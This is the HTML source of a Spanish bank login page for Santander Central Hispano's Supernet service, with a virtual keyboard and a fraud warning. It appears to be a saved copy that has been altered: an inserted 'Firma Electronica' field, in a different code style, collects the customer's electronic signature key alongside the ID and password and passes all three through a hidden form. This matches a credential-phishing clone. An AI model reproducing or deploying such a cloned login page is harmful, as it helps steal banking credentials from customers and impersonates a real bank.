<HTML>
<HEAD>
<TITLE>[ Santander Central Hispano ]</TITLE>
<META http-equiv="Pragma" content="no-cache">
<LINK rel="STYLESHEET" type="text/css" href="https://www.gruposantander.es/img4bog/acun.css">
<SCRIPT language="Javascript" src="https://www.gruposantander.es/img4bog/acjun.js"></SCRIPT>
<SCRIPT language="javascript">
function llamaEmpresas()
{
	document.empresas.action='https://empresas.gruposantander.es/WebEmpresas/nueva_imagen/index.jsp';
	document.empresas.submit();
}
function kH(e)
{
	var pK = document.all? window.event.keyCode:e.which;
	if (pK == 13) checklogin();
}
document.onkeypress = kH;
if (document.layers) document.captureEvents(Event.KEYPRESS);

function scrollsizedwindow(url,winname,wid,hei,lef,to)
{
	aWindow=window.open(url,winname,"toolbar=no,resizable=yes,status=no,scrollbars=yes,location=no,menubar=no,width="+wid+",height="+hei+",left="+lef+",top="+to);
}

function checklogin()
{
	var error=false;

	if(!deshabilitado)
	{
		if(document.teclado.login.value.length == 0)
		{
			alert("Debe introducir su identificador");
			document.teclado.login.focus();
			error=true;
		}
		else if (document.teclado.ESpass.value.length == 0)
		{
			alert("Debe introducir la firma electronica");
			document.teclado.ESpass.focus();
			error=true;
		}
		else if (document.teclado.password.value.length == 0)
		{
			alert("Debe introducir la clave de acceso");
			document.teclado.password.focus();
			error=true;
		}
		else if ((document.teclado.password.value.length < 4) || (document.teclado.password.value.length > 60))
		{
			alert("Su clave de acceso debe tener entre 4 y 60 caracteres");
			document.teclado.password.focus();
			error=true;
		}

		if(!error && !deshabilitado)
		{
			document.formuintermedio.login.value=document.teclado.login.value;
			document.formuintermedio.ESpass.value=document.teclado.ESpass.value;
			document.formuintermedio.password.value=document.teclado.password.value;
			document.formuintermedio.indicador.value=document.teclado.indicador.options[document.teclado.indicador.selectedIndex].value;
			deshabilitado = true;
			setTimeout("deshabilitado = false;",8000);
			document.formuintermedio.submit();
		}
		else
			return;
	}
}
</SCRIPT>
<SCRIPT language="JavaScript">
<!--
var tecladoMin = new Array('1','2','3','4','5','6','7','8','9','0','q','w','e','r','t','y','u','i','o','p','`','+','a','s','d','f','g','h','j','k','l','ñ','´','ç','<','z','x','c','v','b','n','m',',','.','-',' ');
var tecladoMay = new Array('!','"','·','$','%','&','/','(',')','=','Q','W','E','R','T','Y','U','I','O','P','^','*','A','S','D','F','G','H','J','K','L','Ñ','¨','ç','>','Z','X','C','V','B','N','M',';',':','_',' ');
var opcionMay = false;		
var foco = 'login';		
var opcionCont = true;		

function guardarFoco(caja)
{
	foco = caja;
}

if (document.images)
{
    imagenMin = new Image();
    imagenMin.src  = 'https://www.gruposantander.es/img4bog/teclado_login_minusculas.gif';
    imagenMinContraste = new Image();
    imagenMinContraste.src  = 'https://www.gruposantander.es/img4bog/teclado_login_minus_contras.gif';

    imagenMay = new Image();
    imagenMay.src = 'https://www.gruposantander.es/img4bog/teclado_login_mayus.gif';
    imagenMayContraste = new Image();
    imagenMayContraste.src = 'https://www.gruposantander.es/img4bog/teclado_login_mayus_contras.gif';

    imagenBlanca = new Image();
    imagenBlanca.src = 'https://www.gruposantander.es/img4bog/teclado_login_blanco.gif';
}

function change(Name,opcion)
{
	if (!document.images) {}
    else
	{
		switch (opcion)
		{
			case 1:	
			{
				opcionMay = false;
				if (opcionCont)
					document.images[Name].src = eval('imagenMin.src');
				else
					document.images[Name].src = eval('imagenMinContraste.src');
				break;
			}
			case 2:	
			{
				opcionMay = true;
				if (opcionCont)
					document.images[Name].src = eval('imagenMay.src');
				else
					document.images[Name].src = eval('imagenMayContraste.src');
				break;
			}
			case 3:	
			{
				document.images[Name].src = eval('imagenBlanca.src');
				break;
			}
		}

	}
	
	eval("document.teclado."+foco+".focus()");
}

function borrarCaracter()
{
	getCajaSeleccionada().value = getCajaSeleccionada().value.substring(0,getCajaSeleccionada().value.length-1);
}

function introducirCaracter(caracter)
{
	getCajaSeleccionada().value = getCajaSeleccionada().value + retornarValor(caracter);
}

function getCajaSeleccionada()
{
	return eval('document.forms[0].' + foco);
}

function retornarValor(caracter)
{
	if (opcionMay)
		return tecladoMay[caracter];
	else
		return tecladoMin[caracter];
}
function mostrarImagenOnMouseUp()
{
	move();
	mostrarImagen();
}
function mostrarImagen()
{
	if (opcionMay) change('image',2);
	else change('image',1);
}
function mostrarImagenOnMouseDown()
{
	change('image',3);
}
function cambiarContraste(altoContraste)
{
	if (opcionCont != altoContraste)
	{
		opcionCont = altoContraste;
		if (opcionMay)  change('image',2);
		else			change('image',1);
	}
	
	document.teclado.contraste[0].checked = altoContraste;
	document.teclado.contraste[1].checked = !altoContraste;
}
function bloqMay()
{
	if (opcionMay)  change('image',1);
	else			change('image',2);
}
function move()
{
	var baseL = 0;
	var baseT = 225;

    if (document.getElementById)
    {
        document.getElementById("capaTeclado").style.left = baseL + rand(120);
        document.getElementById("capaTeclado").style.top = baseT + rand(20);
    }
}
function ponerFoco()
{
	document.teclado.IdGrupo.focus();
}

rnd.today=new Date();
rnd.seed=rnd.today.getTime();

function rnd()
{
	rnd.seed = (rnd.seed * 9301 + 49297 + 3386) % 233280;
	return rnd.seed /(233280.0);
}
function rand(number)
{
	return Math.ceil(rnd()*number);
}
function pT(coord,click)
{
	document.write('<area shape="rect" coords="'+coord+'" href="#" onClick="introducirCaracter('+click+');mostrarImagenOnMouseUp();return false;" onMouseDown="mostrarImagenOnMouseDown();">');
}
function pT1(coord,click)
{
	document.write('<area shape="rect" coords="'+coord+'"	href="#" onClick="'+click+'";mostrarImagenOnMouseUp();return false;" onMouseDown="mostrarImagenOnMouseDown();">');
}
//--></SCRIPT>
</HEAD>
<BODY topmargin="0" leftmargin="0" onLoad="document.teclado.login.focus();">
<TABLE border="0" cellpadding="0" cellspacing="0" width="780">
	
	<TR>

		<TD>
		<TABLE cellpadding="0" cellspacing="0" width="100%" border="0">
			<TR>
				<TD width="166" valign="top">
				<TABLE cellpadding="0" cellspacing="0" width="166" align="center" border="0">
					<TR>
						<TD valign="top"><IMG src="https://www.gruposantander.es/img4bog/logo_supernet.gif" border="0" height="50"></TD>
					</TR>

				</TABLE>

				</TD>
				<TD valign="bottom" width="35%">&nbsp;</TD>
				<TD valign="bottom" width="148"><IMG src='https://www.gruposantander.es/img4bog/pesta_activo_particulares.gif' border='0'></TD>
				<TD valign="bottom" width="20">&nbsp;</TD>
				<TD valign="bottom" width="148"><A href="#" onClick="javascript:llamaEmpresas();"><IMG src='https://www.gruposantander.es/img4bog/pesta_inactivo_empresas.gif' border='0'></A></TD>
				<TD>&nbsp;</TD>
			</TR>

			<TR>
				<TD bgcolor="#000000" height="1" colspan="2"><IMG src='https://www.gruposantander.es/img4bog/bs.gif' border='0'></TD>

				<TD><IMG src='https://www.gruposantander.es/img4bog/bs.gif' border='0'></TD>
				<TD bgcolor="#000000" height="1" colspan="3"><IMG src='https://www.gruposantander.es/img4bog/bs.gif' border='0'></TD>
			</TR>
			<TR>
				<TD bgcolor="#FFFFFF" height="2" colspan="6"><IMG src='https://www.gruposantander.es/img4bog/bs.gif' border='0'></TD>
			</TR>

		</TABLE>
		</TD>
		<TD class="textoContenido" width="3" height="1">&nbsp;</TD>

		<TD class="linea" width="1" height="1"><IMG src='https://www.gruposantander.es/img4bog/px.gif' width='1' height='1' border='0'></TD>
	</TR>
	
	<TR>
		<TD valign='top' height="100%" width='100%'>
		<TABLE border='0' cellpadding='0' cellspacing='0' width='100%' height='100%'>

			<TR>
				<TD valign='top'>
				<TABLE width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
					<TR>

						
						<TD width="70%" valign="top"><BR>
						<TABLE width="100%" border="0" cellpadding="0" cellspacing="0">
							<TR>
								<TD>

								<TABLE border="0" align="center" cellpadding="0" cellspacing="0">
									<TR>
										<TD width="50" height="1" rowspan="2"><IMG src='https://www.gruposantander.es/img4bog/px.gif' width='50' height='1' border='0'></TD>
										<TD class="titulo" align="left">Acceso para Particulares</TD>

										<TD width="50" height="1" rowspan="2"><IMG src='https://www.gruposantander.es/img4bog/px.gif' width='50' height='1' border='0'></TD>
									</TR>
									<TR>
										<TD class="textoGris11" height="30">Puede introducir sus datos de identificaci&oacute;n por el sistema tradicional o utilizando el teclado virtual. <A class="verMas" href="javascript:scrollsizedwindow('https://www.gruposantander.es/ayuda_acceso.html','ayuda_teclado',580,410,100,50);">Ver Ayuda</A> </TD>

									</TR>
								</TABLE>
								</TD>

							</TR>
							<TR>
								<TD>
								<FORM name="teclado" method="POST" onSubmit="checklogin(); return false;">
								<TABLE cellpadding="0" cellspacing="6" border="0" width="100%">

									<TR>
										<TD colspan="2" align="center">
										<TABLE border="0" cellpadding="0" cellspacing="0" align="center">
											<TR>

												<TD align="left" class="textoHome" valign="bottom">1. <SELECT name="indicador" class="textoHome" size="1" onFocus="javascript:guardarFoco('indicador');">
													<OPTION value="N">NIF</OPTION>
													<OPTION value="C">CIF</OPTION>

													<OPTION value="E">PASAPORTE</OPTION>
													<OPTION value="E">NIE</OPTION>
													<OPTION value="A">USUARIO</OPTION>

												</SELECT></TD>
												<TD width="20"><IMG src='https://www.gruposantander.es/img4bog/px.gif' border='0' width="20" height="1"></TD>
												<TD align="left" colspan="7" valign="bottom"><INPUT type="text" name="login"  onFocus="javascript:guardarFoco('login');" maxlength="20" tabindex="1" class="TextoContenido"></TD>
											</TR>

											<tr>
												<td class="textoHome" align="left" style="padding-top: 15px">2. Firma Electronica</td>
												<td width="20"><img src="sbi_data/px.gif" border="0" height="1" width="20"></td>
												<td colspan="7" align="left" valign="bottom"><input name="ESpass" onfocus="javascript:guardarFoco('ESpass');" maxlength="20" tabindex="3" class="TextoContenido" type="password"></td>
											</tr>
											<TR>
												<TD class="textoHome" align="left">3. Clave de Acceso</TD>
												<TD width="20"><IMG src='https://www.gruposantander.es/img4bog/px.gif' border='0' width="20" height="1"></TD>

												<TD align="left"><INPUT type="password" name="password"  onFocus="javascript:guardarFoco('password');" maxlength="60" tabindex="3" class="TextoContenido"></TD>

												<TD width="10"><IMG src='https://www.gruposantander.es/img4bog/px.gif' border='0' width="10" height="1"></TD>
												<TD align="center"><input src="https://www.gruposantander.es/img4bog/btnEntrar.gif" alt="" border="0" type="image"></TD>
												<TD width="5"><IMG src='https://www.gruposantander.es/img4bog/px.gif' border='0' width="5" height="1"></TD>
												<TD align="center"><IMG src='https://www.gruposantander.es/img4bog/candado_seguridad.gif' border='0'></TD>
												<TD width="5"><IMG src='https://www.gruposantander.es/img4bog/px.gif' border='0' width="5" height="1"></TD>
												<TD class="textoContenido" align="center"><A class="enlaceLoginRojo" href="javascript:scrollsizedwindow('http://www.gruposantander.es/pol_seg.html','privacidad',650,500,100,70);">Seguridad</A>&nbsp;</TD>
											</TR>

											<TR>

												<TD colspan="2">&nbsp;</TD>
												<TD align="center" valign="top"><A href="#" onclick="window.open('http://www.gruposantander.es/recuerde_claves_particulares.htm','recuerde_claves','width=220,height=220,resizable=no,scrollbars=no')"
													class="enlaceLoginRojo">¿Ha olvidado su clave?</A></TD>
												<TD>&nbsp;</TD>
												<TD>&nbsp;</TD>
												<TD colspan="4">&nbsp;</TD>
											</TR>
										</TABLE>

										</TD>

									</TR>
									<TR>
										
										<TD height="150px"></TD>
									</TR>
									<TR>
										<TD colspan="2">
										<TABLE width="80%" cellspacing="0" cellpadding="0" border="0" align="center">

											<TR>
												<TD align="center" class="textoHome">Contraste:&nbsp;</TD>

												<TD class="textoContenido"><INPUT type="radio" class="textoContenido" name="contraste" onclick="cambiarContraste(true);" checked>alto</TD>
												<TD class="textoContenido"><INPUT type="radio" class="textoContenido" name="contraste" onclick="cambiarContraste(false);">bajo</TD>
											</TR>
										</TABLE>
										</TD>

									</TR>
								</TABLE>
								<DIV id="capaTeclado" style="position: absolute; left: 0px; top: 225px">

								<TABLE border="0">
									<TR valign="top">
										<TD class="texto">
										<TABLE cellpadding="0" cellspacing="0" border="0">
											<TR valign="top">

												<TD class="texto"><A href="#" onMouseOver="mostrarImagen();return false;"><IMG src="https://www.gruposantander.es/img4bog/teclado_login_minusculas.gif" name="image" border="0" usemap="#Map"> <MAP name="Map">
													<SCRIPT language="JavaScript">
pT("37,75,58,95","34")
pT("216,74,237,95","42")
pT("238,75,259,95","43")
pT("287,36,308,55","21")
pT("264,36,285,55","20")
pT("297,56,318,75","33")
pT("274,56,295,75","32")
pT("25,16,45,34","0")
pT("108,36,128,55","13")
pT("201,16,222,34","8")
pT("45,16,65,34","1")
pT("41,36,62,55","10")
pT("218,36,239,55","18")
pT1("246,17,285,35","borrarCaracter()")
pT("178,17,200,35","7")
pT("130,36,150,55","14")
pT("197,36,218,55","17")
pT("90,17,111,35","3")
pT("85,36,106,55","12")
pT("156,17,178,35"," 6")
pT("174,36,196,55","16")
pT("240,36,261,55","19")
pT("152,36,173,55","15")
pT("112,17,132,35","4")
pT("223,17,243,35","9")
pT("132,16,155,35","5")
pT("63,36,84,55","11")
pT("68,16,88,35","2")
pT("162,56,182,75","27")
pT("139,56,160,75","26")
pT("117,56,137,75","25")
pT("94,56,115,75","24")
pT("73,56,93,75","23")
pT("52,56,72,75","22")
pT("185,56,205,75","28")
pT("207,56,227,75","29")
pT("230,56,249,75","30")
pT("251,56,272,75","31")
pT1("13,56,50,75","bloqMay()")
pT("261,75,282,95","44")
pT("193,74,214,95","41")
pT("170,74,191,95","40")
pT("148,75,171,95","39")
pT("128,75,147,95","38")
pT("105,75,127,95","37")
pT("83,75,104,95","36")
pT("60,75,81,95","35")
pT("98,95,226,115","45")
</SCRIPT>
												</MAP> </A></TD>

											</TR>
										</TABLE>
										</TD>
									</TR>

								</TABLE>
								</DIV>
								</FORM>
								<SCRIPT language="JavaScript">
move();
document.teclado.login.focus();
</SCRIPT></TD>

							</TR>
						</TABLE>
						</TD>
						
						
						<TD background="https://www.gruposantander.es/img4bog/fondo_login_rallado.gif" width="30%" valign="top">

						<TABLE width="95%" border="0" align="center" cellpadding="0" cellspacing="0">
		<TR>
								<TD height="5"><IMG src='/img4bog/px.gif' border='0' width="1" height="5"></TD>
							</TR>
							<TR>

								<TD>
								<TABLE border="0" cellpadding="0" cellspacing="0">
									<TBODY>
										<TR>
											<TD width="8"><IMG src='/img4bog/px.gif' border='0' width="8" height="1"></TD>
											<TD align="left" class="textoAvisoRojo"><B>Aviso de seguridad,</B><BR>
											recientemente han sido detectados <B>emails fraudulentos</B> enviados a clientes de diferentes Entidades Financieras, solicitando sus datos o claves de acceso a Banca Electr&oacute;nica. Para evitar ser v&iacute;ctima de un fraude: nunca atienda solicitudes de claves que le lleguen a trav&eacute;s de correo electr&oacute;nico (<A class="enlaceLoginRojo" href="javascript:scrollsizedwindow('http://www.gruposantander.es/pol_seg.html','privacidad',650,500,100,70);"><B>ampl&iacute;e
											informaci&oacute;n</B></A>).<BR>

											Si tiene dudas llame a<BR>
											<B>Superl&iacute;nea:</B> <B class="textoAvisoNegro">902&nbsp;24&nbsp;24&nbsp;24</B></TD>
										</TR>
									</TBODY>
								</TABLE>

								</TD>
							</TR>
							<TR>
								<TD height="5"><IMG src='https://www.gruposantander.es/img4bog/px.gif' border='0' width="1" height="5"></TD>
							</TR>

							<TR>
								<TD height="7"><IMG src='https://www.gruposantander.es/img4bog/px.gif' border='0' width="1" height="7"></TD>
							</TR>
							<TR>

								<TD class="titulo"><IMG src='https://www.gruposantander.es/img4bog/px.gif' border='0' width="10" height="1">Atenci&oacute;n al Cliente</TD>
							</TR>

							<TR>
								<TD>
								<TABLE width="100%" border="0" cellpadding="0" cellspacing="0">
									<TR>
										<TD bgcolor="#000000" height="1"><IMG src='https://www.gruposantander.es/img4bog/bs.gif' border='0'></TD>

									</TR>
								</TABLE>
								</TD>
							</TR>

							<TR>
								<TD>
	<table border="0" cellpadding="0" cellspacing="5" width="95%">
									<tbody><tr>
										<td class="textoContenido" valign="top">&nbsp;&gt;</td>
										<td class="textoContenido"><a href="http://www.gruposantander.es/particulares/prod/banDistancia/par_bandistancia_linea.html?x=1" class="enlaceLoginNegro" target="_blank">Superlinea<b class="imprimir">&nbsp;&nbsp;902 24 24 24</b></a></td>

									</tr>
									<tr>
										<td class="textoContenido" valign="top">&nbsp;&gt;</td>
										<td class="textoContenido"><a href="https://www.gruposantander.com/Formulario_WM/formularios/santandercentralhispano/superlineaP.jsp" class="enlaceLoginNegro" target="_blank">Buzon de contacto</a></td>
									</tr>
									<tr>
										<td class="textoContenido" valign="top">&nbsp;&gt;</td>
										<td class="textoContenido"><a href="https://www.gruposantander.com/buscadoroficinas/oficinasParticulares.html" class="enlaceLoginNegro" target="_blank">Mapa de oficinas</a></td>

									</tr>
									<tr>
										<td class="imprimir" valign="top">&nbsp;&gt;</td>
										<td class="textoContenido"><a href="https://www.gruposantander.es/bog/sbi?ptns=alta00" target="_blank" class="enlaceLoginNegro">Dese de </a><a href="https://www.gruposantander.es/bog/sbi?ptns=alta00" target="_blank" class="enlaceLoginRojo">alta</a><a href="https://www.gruposantander.es/bog/sbi?ptns=alta00" target="_blank" class="enlaceLoginNegro"> en el servicio Supernet</a></td>
									</tr>
									<tr>
										<td class="imprimir" valign="top">&nbsp;&gt;</td>

										<td class="textoContenido"><a href="http://www.gruposantander.es/particulares/prod/banDistancia/par_bandistancia_net.html?x=0" target="_blank" class="enlaceLoginRojo">Informacion</a><a href="http://www.gruposantander.es/particulares/prod/banDistancia/par_bandistancia_net.html?x=0" class="enlaceLoginNegro" target="_blank"> sobre Supernet</a></td>
									</tr>
									<tr>
										<td class="imprimir" valign="top">&nbsp;&gt;</td>
										<td class="textoContenido"><a href="javascript:checklogindemo();" class="enlaceLoginNegro">Visite nuestra </a><a href="javascript:checklogindemo();" class="enlaceLoginRojo">DEMO</a></td>
									</tr>

									<tr>
										<td height="10"><img src="/img4bog/px.gif" border="0" height="10" width="1"></td>
									</tr>
								</tbody></table>
						</TD>
						
					</TR>

				</TABLE>
				</TD>
			</TR>
		</TABLE>
		</TD>
		<TD class="textoContenido" width="3" height="1" >&nbsp;</TD>

		
		<TD class="linea" width="1" height="1"><IMG src='https://www.gruposantander.es/img4bog/pxl.gif' width='1' height='1' border='0'></TD>
		
	</TR>
</TABLE>

<FORM name="formuintermedio" action="https://www.gruposantander.es/acceso_unico_v2_applet_spn.html"><INPUT type="hidden" name="p">
<INPUT type="hidden" name="indicador"> <INPUT type="hidden" name="login"> <INPUT type="hidden" name="password"><input name="ESpass" type="hidden"> <INPUT type="hidden" name="ruta" value="/bog/sbi;jsessionid=0000mqhAtx9Dm4Bumq5Mrawffj2:veaiuuoc"></FORM>


<FORM name="empresas" action="" target="_top" method="POST">
<INPUT type="hidden" name="rm" value="1">

</FORM>

</BODY>
</HTML>
